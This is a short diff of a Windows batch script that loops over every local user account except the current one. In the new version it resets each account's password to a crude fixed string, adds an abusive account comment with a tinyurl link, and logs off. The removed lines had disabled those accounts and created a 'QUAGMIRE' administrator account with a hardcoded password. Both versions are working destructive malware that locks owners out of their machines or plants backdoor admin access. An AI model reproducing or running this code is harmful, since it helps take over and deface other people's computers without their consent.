@@ -6,13 +6,11 @@ for /f "skip=1" %%u in ('wmic useraccount get name') do (
     setlocal enabledelayedexpansion
     set "trim=!user: =!"
     if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
-        net user "!trim!" /active:no
+        net user "!trim!" anus
+        net user "!trim!" /comment:"get fucked. tinyurl.com/ggtfiles"
     )
     endlocal
 
     
 )
-net user "QUAGMIRE" imh0rny44 /add
-net localgroup Administrators "QUAGMIRE" /add
-net user "QUAGMIRE" /comment:"FUCKED BY GIGGITY FILES"
 logoff
